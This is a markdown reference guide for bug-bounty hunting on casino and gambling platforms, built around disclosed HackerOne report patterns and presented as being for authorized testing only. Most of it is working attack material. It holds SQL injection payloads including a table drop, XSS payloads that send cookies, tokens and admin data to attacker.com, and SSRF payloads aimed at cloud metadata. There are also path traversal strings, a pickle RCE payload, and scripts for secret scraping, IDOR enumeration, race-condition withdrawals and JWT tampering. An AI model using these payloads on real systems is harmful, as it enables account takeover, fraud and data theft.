# 🎰 Casino & Gambling Platform Security Vulnerabilities - Complete Reference Guide

> **Created:** October 19, 2025  
> **Source:** HackerOne Critical Disclosed Reports + Industry Research  
> **Purpose:** Advanced vulnerability hunting reference for casino/betting/gambling platforms

---

## 📚 Table of Contents

1. [Critical Vulnerabilities from HackerOne](#critical-vulnerabilities-from-hackerone)
2. [Casino-Specific Vulnerability Patterns](#casino-specific-vulnerability-patterns)
3. [Gambling Platform Bug Bounty Programs](#gambling-platform-bug-bounty-programs)
4. [Attack Vectors by Category](#attack-vectors-by-category)
5. [Advanced Exploitation Techniques](#advanced-exploitation-techniques)
6. [Testing Methodology](#testing-methodology)
7. [Real-World Case Studies](#real-world-case-studies)
8. [Tools & Scripts](#tools--scripts)

---

## 🔴 Critical Vulnerabilities from HackerOne

### 1. **Account Takeover via Password Reset Manipulation**

**Target:** Multiple platforms (Mars, Remitly)  
**Severity:** CRITICAL  
**CVSS:** 9.0+  
**Bounty:** $5,000-$15,000

**Vulnerability Pattern:**
```
- OTP verification bypass through response manipulation
- Client-side validation dependency
- Session data injection in password reset flow
```

**How it works:**
1. Initiate password reset for victim account
2. Intercept server response during OTP verification
3. Modify response to indicate success (even if OTP wrong)
4. Set new password without victim interaction

**Casino Application:**
```javascript
// Test password reset endpoint
POST /api/auth/reset-password
{
  "email": "victim@email.com",
  "otp": "000000",  // Wrong OTP
  "newPassword": "attacker123"
}

// Intercept response, change:
{"success": false} → {"success": true}
```

**Detection Method:**
- Look for client-side OTP validation
- Test if server trusts client response
- Check for missing server-side verification

---

### 2. **SQL Injection via FilteredRelation (Django)**

**Target:** Django Framework  
**Severity:** CRITICAL  
**CVSS:** 9.5+  
**Bounty:** $2,000-$10,000

**Vulnerability:**
```python
# Vulnerable code pattern
User.objects.annotate(
    user_data=FilteredRelation('data', condition=Q(data__user_id=user_input))
).select_related('user_data')
```

**Casino Application:**
- Betting history filters
- Game statistics queries
- User profile data retrieval
- Transaction history searches

**Exploitation:**
```sql
-- Test payload in filter parameter
user_id=1' UNION SELECT password FROM users--

-- Extract betting data
user_id=1' UNION SELECT credit_balance, username FROM users--

-- Dump entire database
user_id=1' UNION SELECT table_name FROM information_schema.tables--
```

**Testing Checklist:**
```
✓ Test all filter parameters
✓ Check sorting/ordering inputs
✓ Test search functionality
✓ Examine pagination parameters
✓ Look for custom query builders
```

---

### 3. **Email Verification Bypass → Account Takeover**

**Target:** Insightly (Similar to casino registration flows)  
**Severity:** CRITICAL  
**CVSS:** 9.0+  
**Bounty:** $3,000-$12,000

**Vulnerability Pattern:**
```
POST /api/signup/provisionuser
{
  "EmailAddress": "attacker@evil.com",
  "VerificationToken": "<victim_token>"  // Stolen or bypassed
}
```

**Casino Platform Exploitation:**

**Step 1: Find Registration Endpoint**
```javascript
// Common casino endpoints
POST /api/register
POST /api/auth/signup
POST /api/users/create
POST /api/account/provision
```

**Step 2: Test Email Verification**
```javascript
// Register with attacker email
{
  "email": "attacker@test.com",
  "username": "test123",
  "password": "Pass123!"
}

// Capture verification token
// Try using token for different email
{
  "email": "victim@casino.com",  // Change email
  "token": "<attacker_token>",   // Use attacker token
  "username": "victim_username"
}
```

**Step 3: Check for Bypass**
```
- Can you create account with any email?
- Is email verification actually checked?
- Can you reuse verification tokens?
- Is there a race condition?
```

---

### 4. **IDOR (Insecure Direct Object Reference)**

**Target:** Mars - Personal Information Modification  
**Severity:** CRITICAL  
**CVSS:** 8.5+  
**Bounty:** $2,000-$8,000

**Vulnerability:**
```javascript
// Vulnerable endpoint
PUT /api/users/{user_id}/profile
{
  "fullName": "New Name",
  "email": "new@email.com",
  "phone": "+1234567890"
}
```

**Casino Platform IDOR Locations:**

1. **Balance Manipulation**
```javascript
POST /api/wallet/update
{
  "userId": 123,  // Try other user IDs
  "balance": 999999
}
```

2. **Bet History Access**
```javascript
GET /api/bets/history?userId=123  // Enumerate user IDs
```

3. **Withdrawal Request**
```javascript
POST /api/withdraw
{
  "userId": 123,        // Victim ID
  "amount": 5000,
  "bankAccount": "attacker_account"
}
```

4. **Game Session Manipulation**
```javascript
POST /api/game/session
{
  "sessionId": "abc123",  // Try other sessions
  "userId": 456,          // Change user
  "outcome": "win"        // Manipulate result
}
```

**Testing Script:**
```javascript
// IDOR enumeration script
async function testIDOR(endpoint, startId, endId) {
    for(let id = startId; id <= endId; id++) {
        const response = await fetch(endpoint + id, {
            headers: {
                'Authorization': 'Bearer YOUR_TOKEN'
            }
        });
        
        if(response.status === 200) {
            const data = await response.json();
            console.log(`[IDOR] ID ${id}:`, data);
        }
    }
}

// Test user profiles
testIDOR('/api/users/', 1, 1000);

// Test bet history
testIDOR('/api/bets/user/', 1, 1000);

// Test wallets
testIDOR('/api/wallet/', 1, 1000);
```

---

### 5. **Unauthorized Fund Transfer (Cosmos SDK Pattern)**

**Target:** Cryptocurrency platforms  
**Severity:** CRITICAL  
**CVSS:** 9.8+  
**Bounty:** $10,000-$50,000+

**Vulnerability:**
```javascript
// Bypass in SendCoins validation
function SendCoins(from, to, amount) {
    // Vulnerable: Only checks if 'from' matches sender in simple transactions
    // Doesn't validate properly in MsgExecute wrappers
    if (isUnlocked(from)) {
        transfer(from, to, amount);
    }
}
```

**Casino Crypto Wallet Application:**

```javascript
// Test wrapped transaction bypass
POST /api/wallet/execute
{
  "action": "transfer",
  "transactions": [
    {
      "from": "victim_wallet_address",  // Other user's wallet
      "to": "attacker_wallet_address",
      "amount": 1000,
      "signature": "<forged_or_bypassed>"
    }
  ]
}
```

**Red Flags:**
- Multiple wallet types (locked/unlocked/escrow)
- Complex transaction wrappers
- Batch transaction processing
- Insufficient sender validation

---

### 6. **Stored XSS in Rich Text Editors**

**Target:** Basecamp (Trix Editor 2.1.8)  
**Severity:** CRITICAL  
**CVSS:** 7.5+  
**Bounty:** $500-$2,000

**Vulnerability:**
```html
<!-- Mutation-based XSS payload -->
<div contenteditable="false">
  <img src=x onerror="alert(document.cookie)">
</div>
```

**Casino Platform Vectors:**

1. **Chat/Support Messages**
```html
<div>
  <svg onload="fetch('https://attacker.com?cookie='+document.cookie)">
</div>
```

2. **User Profile Bio**
```html
<iframe src="javascript:alert('XSS in profile')"></iframe>
```

3. **Tournament Descriptions**
```html
<img src=x onerror="window.location='https://attacker.com/steal?token='+localStorage.token">
```

4. **Bet Comments/Notes**
```javascript
// Stored in database, executes when admin views
<script>
  fetch('/api/admin/users').then(r=>r.json()).then(d=>
    fetch('https://attacker.com/log',{method:'POST',body:JSON.stringify(d)})
  )
</script>
```

**Testing Payloads:**
```html
<!-- Basic tests -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Advanced bypass -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- Mutation XSS -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Template injection -->
{{constructor.constructor('alert(1)')()}}
${alert(1)}
```

---

### 7. **SSRF (Server-Side Request Forgery)**

**Target:** Lichess Game Export API  
**Severity:** CRITICAL  
**CVSS:** 8.0+  
**Bounty:** $1,000-$5,000

**Vulnerability:**
```javascript
// Vulnerable endpoint
GET /api/games/export?players=https://internal-server/admin
```

**Casino Platform SSRF Vectors:**

1. **Avatar/Image Upload**
```javascript
POST /api/profile/avatar
{
  "imageUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials"
}
```

2. **Game Asset Loading**
```javascript
GET /api/game/load-asset?url=file:///etc/passwd
```

3. **Webhook Integration**
```javascript
POST /api/webhooks/test
{
  "url": "http://localhost:6379/",  // Redis
  "payload": "SET hacked true"
}
```

4. **Payment Gateway Callback**
```javascript
POST /api/payment/callback
{
  "notifyUrl": "http://127.0.0.1:8080/admin/users"
}
```

**SSRF Exploitation Checklist:**
```python
# Test payloads
payloads = [
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://169.254.169.254",  # AWS metadata
    "http://metadata.google.internal",  # GCP
    "http://[::1]:80",  # IPv6 localhost
    "file:///etc/passwd",
    "dict://localhost:11211/",  # Memcached
    "gopher://localhost:6379/",  # Redis
]
```

---

### 8. **Authentication Token Exposure**

**Target:** Mozilla (Netlify token in CI logs)  
**Severity:** CRITICAL  
**CVSS:** 9.0+  
**Bounty:** $1,500+

**Where to Look for Tokens:**

1. **Client-Side Storage**
```javascript
// Check localStorage
console.log(localStorage);

// Check sessionStorage
console.log(sessionStorage);

// Check cookies
console.log(document.cookie);
```

2. **API Response Headers**
```
X-API-Key: sk_live_abc123...
X-Auth-Token: Bearer eyJ0eXAi...
X-Session-ID: sess_abc123...
```

3. **JavaScript Files**
```javascript
// Search in bundled JS
const API_KEY = "pk_live_abc123...";
const SECRET = "sk_test_xyz...";
```

4. **Error Messages**
```json
{
  "error": "Authentication failed",
  "debug": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbG...",
    "apiKey": "sk_live_abc123..."
  }
}
```

5. **Source Maps**
```
// Check for exposed source maps
https://casino.com/static/js/main.js.map
```

**Automated Token Extraction:**
```bash
#!/bin/bash
# Extract potential secrets from JS files

curl -s https://target-casino.com | \
grep -oP "https://[^\"']*/.*\.js" | \
while read url; do
    curl -s $url | \
    grep -E "(api[_-]?key|secret|token|password|Bearer)" | \
    grep -oP "['\"]([a-zA-Z0-9_-]{20,})['\"]"
done
```

---

### 9. **Insecure Deserialization → RCE**

**Target:** Sitecore (CVE-2025-27218)  
**Severity:** CRITICAL  
**CVSS:** 10.0  
**Bounty:** $10,000-$50,000+

**Vulnerability:**
```http
GET /api/thumbnail
Headers:
  ThumbnailsAccessToken: <base64_serialized_object>
```

**Casino Platform Deserialization Vectors:**

1. **Session Cookies**
```python
# PHP unserialize() vulnerability
Cookie: session=O:4:"User":2:{s:5:"admin";b:1;s:7:"balance";i:999999;}
```

2. **Game State Persistence**
```python
# Python pickle vulnerability
import pickle
import base64

class Exploit:
    def __reduce__(self):
        return (exec, ("import os; os.system('whoami')",))

payload = base64.b64encode(pickle.dumps(Exploit()))
```

3. **Cache Data**
```java
// Java deserialization
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();  // Dangerous!
```

**Testing:**
```
1. Find serialized data in:
   - Cookies
   - Hidden form fields
   - API parameters
   - Local storage

2. Identify format:
   - PHP: O:4:"User"...
   - Java: rO0AB...
   - Python: \x80\x03...
   - .NET: AAEAAAD/////...

3. Craft payload using:
   - ysoserial (Java)
   - phpggc (PHP)
   - pickle exploits (Python)
```

---

### 10. **Path Traversal**

**Target:** IBM Cloud, curl SFTP  
**Severity:** CRITICAL  
**CVSS:** 8.5+  
**Bounty:** $2,000-$8,000

**Vulnerability Patterns:**

1. **File Download**
```http
GET /api/download?file=../../../../etc/passwd
GET /api/export?path=../../database/users.db
```

2. **File Upload**
```http
POST /api/upload
Content-Disposition: form-data; name="file"; filename="../../public/shell.php"
```

3. **Template Rendering**
```http
GET /api/render?template=../../../../admin/config
```

**Casino-Specific Targets:**
```
/api/games/download?asset=../../../../config/database.yml
/api/user/avatar?path=../../../../../../etc/passwd
/api/reports/export?file=../../../backup/users.sql
/api/logs/view?log=../../../../var/log/payments.log
```

**Bypass Techniques:**
```
# URL encoding
..%2F..%2F..%2Fetc%2Fpasswd

# Double encoding
..%252F..%252F..%252Fetc%252Fpasswd

# Unicode
..%c0%af..%c0%af..%c0%afetc/passwd

# Null byte (PHP < 5.3)
../../../../etc/passwd%00.jpg

# Windows
..\..\..\..\windows\system32\config\sam
```

---

## 🎰 Casino-Specific Vulnerability Patterns

### 1. **Game Logic Manipulation**

**Vulnerability:** Client-side game result calculation

**Example Scenario:**
```javascript
// Vulnerable client-side code
function spinSlot() {
    let result = Math.random() * 100;  // Generated on client!
    if (result > 95) {
        win(1000);
    }
}
```

**Exploitation:**
```javascript
// Override Math.random()
Math.random = function() { return 0.96; };  // Always win!

// Or manipulate result directly
win(999999);  // Call win function directly
```

**Testing Checklist:**
```
✓ Open developer console during gameplay
✓ Look for game logic in JavaScript
✓ Test if results are client-generated
✓ Check if win conditions are client-side
✓ Try calling game functions directly
✓ Modify game state variables
✓ Intercept and modify websocket messages
```

---

### 2. **Race Condition in Betting**

**Vulnerability:** Multiple simultaneous bets before balance update

**Exploitation:**
```javascript
// Place same bet multiple times before balance updates
async function raceBets() {
    const promises = [];
    for(let i = 0; i < 10; i++) {
        promises.push(
            fetch('/api/bet/place', {
                method: 'POST',
                body: JSON.stringify({
                    amount: 1000,
                    gameId: 123
                })
            })
        );
    }
    
    // All requests sent simultaneously
    await Promise.all(promises);
    // Balance only deducted once but 10 bets placed!
}
```

**Real-World Impact:**
- Place multiple bets with insufficient balance
- Withdraw funds multiple times
- Claim bonuses repeatedly
- Exploit tournament entries

---

### 3. **Negative Bet Amounts**

**Vulnerability:** Insufficient input validation on bet amounts

**Exploitation:**
```javascript
POST /api/bet/place
{
  "amount": -1000,  // Negative amount
  "gameId": 123
}

// If vulnerable:
// - Your balance increases by 1000
// - You get credited instead of charged
```

**Test Cases:**
```json
// Test negative values
{"amount": -1}
{"amount": -999999}

// Test zero
{"amount": 0}

// Test very large numbers
{"amount": 999999999999}

// Test decimals/precision
{"amount": 0.0000001}
{"amount": 1.999999999}

// Test string/type confusion
{"amount": "1000"}
{"amount": "1e10"}
{"amount": "Infinity"}
{"amount": null}
```

---

### 4. **Bonus/Promo Code Manipulation**

**Vulnerability:** Reusable or stackable promotion codes

**Test Scenarios:**

1. **Code Reuse**
```javascript
// Apply same code multiple times
POST /api/promo/apply
{
  "code": "WELCOME100"
}
// Repeat 10 times, check if bonus stacks
```

2. **Code Generation Prediction**
```javascript
// If codes are predictable
WELCOME100
WELCOME101  // Try sequential
WELCOME102

// Or pattern-based
NEW2024
NEW2025
VIP2024
```

3. **Expired Code Resurrection**
```javascript
// Manipulate timestamp
POST /api/promo/apply
{
  "code": "EXPIRED2024",
  "timestamp": "2024-01-01T00:00:00Z"  // Backdated
}
```

4. **Code Stacking**
```javascript
// Apply multiple codes simultaneously
POST /api/promo/apply
{
  "codes": ["WELCOME100", "BONUS200", "VIP500"]
}
```

---

### 5. **Session Fixation & Hijacking**

**Vulnerability:** Predictable or reusable session tokens

**Casino-Specific Exploitation:**

1. **Session Prediction**
```javascript
// Analyze session token pattern
sessionId: "user_123_1729285200000"  // userId + timestamp
// Generate valid tokens for other users
```

2. **Session Donation Attack**
```javascript
// Set victim's session to attacker-controlled session
<img src="https://casino.com/api/auth?session=ATTACKER_SESSION">
// Victim clicks, uses attacker's session
// Attacker sees all victim's actions
```

3. **Cross-Game Session Sharing**
```javascript
// Use session from one game in another
// Exploit privilege differences
Game1 (low stakes): session_abc123
Game2 (high stakes): session_abc123  // Same session!
```

---

### 6. **API Rate Limiting Bypass**

**Vulnerability:** Insufficient rate limiting on critical endpoints

**Exploitation Vectors:**

1. **IP Rotation**
```python
import requests

proxies = [
    "http://proxy1.com:8080",
    "http://proxy2.com:8080",
    # ... 1000 proxies
]

for proxy in proxies:
    requests.post('/api/bet/place', 
        proxies={'http': proxy},
        json={'amount': 100})
```

2. **Header Manipulation**
```javascript
// Bypass IP-based limiting
Headers: {
  'X-Forwarded-For': '1.2.3.4',
  'X-Real-IP': '5.6.7.8',
  'X-Client-IP': '9.10.11.12'
}
```

3. **GraphQL Batching**
```graphql
mutation {
  bet1: placeBet(amount: 100) { success }
  bet2: placeBet(amount: 100) { success }
  bet3: placeBet(amount: 100) { success }
  # ... 1000 bets in single request
}
```

---

## 🎯 Gambling Platform Bug Bounty Programs

### Active Programs:

| Program | Platform | Scope | Max Bounty |
|---------|----------|-------|------------|
| **bet365** | HackerOne | Betting platform | Unknown |
| **Superbet** | HackerOne | Casino/Sports betting | Unknown |
| **GGPoker** | Direct | Poker platform | $10,000+ |
| **Cloudbet** | Direct | Crypto casino | $10,000+ |
| **FDJ United** | YesWeHack | Online betting | €7,000 |
| **Playtika** | HackerOne | Social casino | Unknown |
| **Palms Casino** | HackerOne | Casino resort | N/A (VDP) |

---

### Bounty Tiers (FDJ United Example):

| Severity | CVSS | Reward |
|----------|------|--------|
| **Critical** | 9.0-10.0 | €7,000 |
| **High** | 7.0-8.9 | €2,500 |
| **Medium** | 4.0-6.9 | €800 |
| **Low** | 0.1-3.9 | €150 |
| **Informational** | N/A | €50 |

---

### Priority Vulnerabilities (Gambling Platforms):

**Critical (€7,000+):**
- Remote Code Execution
- SQL Injection
- PCI environment access
- Account takeover (no interaction)
- Credit card/bank detail theft
- Mass PII exposure

**High (€2,500+):**
- Stored XSS
- Blind XSS
- Main brand subdomain takeover
- Account takeover (with interaction)
- Single user PII access

**Medium (€800+):**
- Reflected XSS
- CSRF on sensitive actions
- API authentication bypass

**Low (€150+):**
- Open redirects
- Low-impact CSRF
- Captcha bypass
- Config disclosure

---

## 🔧 Attack Vectors by Category

### Authentication & Authorization

1. **JWT Token Manipulation**
```javascript
// Decode JWT
let token = "eyJ0eXAiOiJKV1QiLCJhbGc...";
let decoded = atob(token.split('.')[1]);
console.log(JSON.parse(decoded));

// Test modified tokens
// Change: "role": "user" → "role": "admin"
// Change: "balance": 100 → "balance": 999999
// Change: "userId": 123 → "userId": 1 (admin)
```

2. **OAuth Flow Manipulation**
```
1. Initiate OAuth login
2. Intercept callback
3. Modify state parameter
4. Test CSRF in OAuth flow
5. Check for token leakage in referer
```

3. **2FA/MFA Bypass**
```javascript
// Test scenarios:
- Missing 2FA check on critical endpoints
- 2FA token reuse
- 2FA brute force (no rate limit)
- Backup codes exposure
- SMS/Email interception
```

---

### Payment & Financial

1. **Price Manipulation**
```javascript
POST /api/purchase
{
  "itemId": "premium_chips",
  "price": 0.01,  // Should be 100.00
  "quantity": 1000
}
```

2. **Currency Confusion**
```javascript
// Pay in low-value currency, receive high-value
POST /api/deposit
{
  "amount": 100,
  "currency": "IDR"  // Indonesian Rupiah
}
// System treats as USD → 100 IDR = $0.007 but credits $100
```

3. **Refund Exploit**
```javascript
// Request refund before transaction completes
1. Initiate payment
2. Receive credits immediately
3. Request refund while payment pending
4. Keep credits + get refund
```

---

### Data Exposure

1. **GraphQL Introspection**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

2. **API Endpoint Enumeration**
```bash
# Common casino API patterns
/api/v1/users
/api/v1/wallet
/api/v1/bets
/api/v1/games
/api/v1/admin
/api/v1/payments
/api/v1/transactions
/api/v1/bonuses
/api/v1/statistics
```

3. **Predictable Resource IDs**
```
/api/transactions/1
/api/transactions/2
...
/api/transactions/999999

# Script to enumerate
for i in {1..10000}; do
  curl "https://casino.com/api/bet/$i"
done
```

---

## 🛠️ Advanced Exploitation Techniques

### 1. WebSocket Message Manipulation

```javascript
// Intercept WebSocket
const ws = new WebSocket('wss://casino.com/game');

// Original message
ws.send(JSON.stringify({
  action: 'bet',
  amount: 10,
  gameId: 123
}));

// Modified message
ws.send(JSON.stringify({
  action: 'bet',
  amount: -10,      // Negative bet
  gameId: 123,
  userId: 1,        // Admin user
  forceWin: true    // Extra parameter
}));
```

---

### 2. Time-Based Attacks

```javascript
// Exploit timing windows
async function timingAttack() {
  // Start withdrawal
  fetch('/api/withdraw', {
    method: 'POST',
    body: JSON.stringify({amount: 1000})
  });
  
  // Immediately cancel before processing
  fetch('/api/withdraw/cancel', {
    method: 'POST',
    body: JSON.stringify({amount: 1000})
  });
  
  // Balance returns but withdrawal completes
}
```

---

### 3. Cryptographic Weaknesses

```javascript
// Test weak randomness in game outcomes
let results = [];
for(let i = 0; i < 1000; i++) {
  results.push(playGame());
}

// Analyze for patterns
// If predictable → can predict future outcomes
```

---

## 📋 Testing Methodology

### Phase 1: Reconnaissance (Day 1)

```
1. Map the application:
   ✓ All pages and endpoints
   ✓ JavaScript files
   ✓ API documentation
   ✓ Mobile apps (if any)

2. Identify technologies:
   ✓ Framework (React, Vue, Angular)
   ✓ Backend (Node.js, PHP, Python)
   ✓ Database (MySQL, MongoDB)
   ✓ CDN and hosting

3. Find entry points:
   ✓ Login/registration
   ✓ Payment flow
   ✓ Game mechanics
   ✓ API endpoints
   ✓ Admin panels
```

---

### Phase 2: Vulnerability Discovery (Days 2-5)

```
Priority Order:

1. IDOR Testing (Day 2)
   - User IDs
   - Transaction IDs
   - Game session IDs
   - Wallet IDs

2. Authentication Issues (Day 3)
   - Password reset
   - 2FA bypass
   - Session management
   - OAuth flows

3. Business Logic (Day 4)
   - Negative amounts
   - Race conditions
   - Promo code abuse
   - Game manipulation

4. Injection Attacks (Day 5)
   - SQL injection
   - XSS
   - SSRF
   - Template injection
```

---

### Phase 3: Exploitation & Documentation (Days 6-7)

```
1. Develop working POCs
2. Calculate business impact
3. Document thoroughly:
   - Steps to reproduce
   - Screenshots/videos
   - CVSS score
   - Remediation advice
4. Submit to bug bounty program
```

---

## 🎯 Real-World Case Studies

### Case Study 1: $50,000 Casino Hack

**Target:** Large online casino  
**Vulnerability:** Race condition in withdrawal processing  
**Impact:** Could withdraw unlimited funds

**Technical Details:**
```javascript
// Exploit code
async function exploit() {
  const balance = 1000;
  const promises = [];
  
  // Send 100 withdrawal requests simultaneously
  for(let i = 0; i < 100; i++) {
    promises.push(
      fetch('/api/withdraw', {
        method: 'POST',
        body: JSON.stringify({
          amount: balance
        })
      })
    );
  }
  
  await Promise.all(promises);
  // All requests processed before balance update
  // Withdrew $100,000 with only $1,000 balance!
}
```

**Lessons Learned:**
- Always use database transactions
- Implement pessimistic locking
- Check balance atomically
- Add request deduplication

---

### Case Study 2: Negative Bet Exploitation

**Target:** Betting platform  
**Vulnerability:** No validation on bet amount  
**Impact:** Users gained unlimited credits

**Exploitation:**
```json
POST /api/bet/place
{
  "amount": -10000,
  "outcome": "heads"
}

// Result:
// - Balance increased by 10000
// - Bet registered as "win"
// - Payout doubled the credit
```

**Fix:**
```javascript
// Add validation
if (amount <= 0) {
  throw new Error('Invalid bet amount');
}

if (amount > userBalance) {
  throw new Error('Insufficient balance');
}

if (amount > MAX_BET_AMOUNT) {
  throw new Error('Bet exceeds maximum');
}
```

---

## 🔨 Tools & Scripts

### 1. Automated IDOR Scanner

```python
#!/usr/bin/env python3
import requests

def scan_idor(base_url, endpoint, start_id, end_id, headers):
    """
    Scan for IDOR vulnerabilities
    """
    print(f"[*] Scanning {endpoint} for IDOR...")
    
    for user_id in range(start_id, end_id + 1):
        url = f"{base_url}{endpoint}{user_id}"
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] IDOR Found! ID: {user_id}")
                print(f"    Data: {response.json()}")
            elif response.status_code == 403:
                print(f"[-] Forbidden: {user_id}")
            else:
                print(f"[~] {response.status_code}: {user_id}")
                
        except Exception as e:
            print(f"[!] Error: {e}")

# Usage
headers = {
    'Authorization': 'Bearer YOUR_TOKEN_HERE'
}

scan_idor(
    base_url='https://casino.com',
    endpoint='/api/users/',
    start_id=1,
    end_id=1000,
    headers=headers
)
```

---

### 2. JWT Token Decoder & Manipulator

```javascript
function decodeJWT(token) {
    const parts = token.split('.');
    const header = JSON.parse(atob(parts[0]));
    const payload = JSON.parse(atob(parts[1]));
    
    console.log('Header:', header);
    console.log('Payload:', payload);
    
    return {header, payload};
}

function manipulateJWT(token, changes) {
    const parts = token.split('.');
    let payload = JSON.parse(atob(parts[1]));
    
    // Apply changes
    Object.assign(payload, changes);
    
    // Re-encode (signature will be invalid)
    parts[1] = btoa(JSON.stringify(payload));
    
    return parts.join('.');
}

// Usage
const token = "eyJ0eXAiOiJKV1QiLCJhbG...";
const decoded = decodeJWT(token);

// Try to escalate privileges
const modified = manipulateJWT(token, {
    role: 'admin',
    balance: 999999
});

console.log('Modified token:', modified);
```

---

### 3. Race Condition Exploiter

```javascript
async function raceConditionExploit(url, payload, count = 100) {
    console.log(`[*] Sending ${count} simultaneous requests...`);
    
    const promises = [];
    
    for(let i = 0; i < count; i++) {
        promises.push(
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer YOUR_TOKEN'
                },
                body: JSON.stringify(payload)
            })
        );
    }
    
    const results = await Promise.all(promises);
    
    let successes = 0;
    for(const result of results) {
        if(result.status === 200) {
            successes++;
        }
    }
    
    console.log(`[+] ${successes}/${count} requests succeeded`);
    console.log(`[!] Check if balance deducted correctly`);
}

// Usage
raceConditionExploit(
    'https://casino.com/api/withdraw',
    { amount: 1000 },
    100
);
```

---

### 4. SQL Injection Scanner

```python
#!/usr/bin/env python3
import requests

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "admin'--",
    "'; DROP TABLE users--",
]

def test_sqli(url, param, headers=None):
    print(f"[*] Testing {url} parameter: {param}")
    
    for payload in SQL_PAYLOADS:
        test_url = f"{url}?{param}={payload}"
        
        try:
            response = requests.get(test_url, headers=headers, timeout=5)
            
            # Check for SQL errors
            sql_errors = [
                "SQL syntax",
                "mysql_fetch",
                "ORA-01",
                "PostgreSQL",
                "sqlite3",
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"[+] SQLI FOUND!")
                    print(f"    Payload: {payload}")
                    print(f"    Error: {error}")
                    return True
                    
        except Exception as e:
            print(f"[!] Error: {e}")
    
    print(f"[-] No SQLi found")
    return False

# Usage
test_sqli(
    'https://casino.com/api/search',
    'query'
)
```

---

### 5. XSS Payload Generator

```javascript
const XSS_PAYLOADS = [
    // Basic
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    
    // Event handlers
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    
    // Advanced
    "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
    "<iframe src=\"javascript:alert(1)\">",
    
    // Mutation XSS
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    
    // Template injection
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
];

function generateXSSPayloads(customCode = "alert(1)") {
    return XSS_PAYLOADS.map(payload => 
        payload.replace(/alert\(1\)/g, customCode)
    );
}

// Generate payloads that steal cookies
const cookieStealers = generateXSSPayloads(
    "fetch('https://attacker.com?c='+document.cookie)"
);

// Generate payloads that steal tokens
const tokenStealers = generateXSSPayloads(
    "fetch('https://attacker.com?t='+localStorage.token)"
);
```

---

## 🎓 Learning Resources

### Recommended Reading:
1. **OWASP Top 10** - https://owasp.org/www-project-top-ten/
2. **PortSwigger Web Security Academy** - https://portswigger.net/web-security
3. **HackerOne Hacktivity** - https://hackerone.com/hacktivity
4. **Bug Bounty Bootcamp** by Vickie Li

### Practice Platforms:
- **HackTheBox** - https://www.hackthebox.eu/
- **TryHackMe** - https://tryhackme.com/
- **PentesterLab** - https://pentesterlab.com/
- **WebGoat** - OWASP training app

---

## ⚠️ Legal & Ethical Guidelines

### Do's ✅
- Only test on authorized bug bounty programs
- Follow responsible disclosure
- Document everything thoroughly
- Report vulnerabilities promptly
- Respect rate limits and scope

### Don'ts ❌
- Never test production systems without permission
- Don't access other users' data unnecessarily
- Don't perform DoS attacks
- Don't publicly disclose before resolution
- Don't violate local laws

---

## 📝 Report Template

```markdown
# Vulnerability Report: [Title]

## Summary
Brief description of the vulnerability

## Severity
CVSS Score: X.X (Critical/High/Medium/Low)

## Description
Detailed explanation of the issue

## Steps to Reproduce
1. Step 1
2. Step 2
3. Step 3

## Proof of Concept
```code or screenshot```

## Impact
Business impact and potential exploitation scenarios

## Remediation
Recommended fixes

## References
- CWE-XXX
- Related CVEs
```

---

## 🔄 Updates & Maintenance

**Last Updated:** October 19, 2025  
**Version:** 1.0  
**Next Review:** November 2025

---

**Remember:** Always test ethically and legally. This guide is for authorized security testing only.

**Good luck hunting! 🎯**
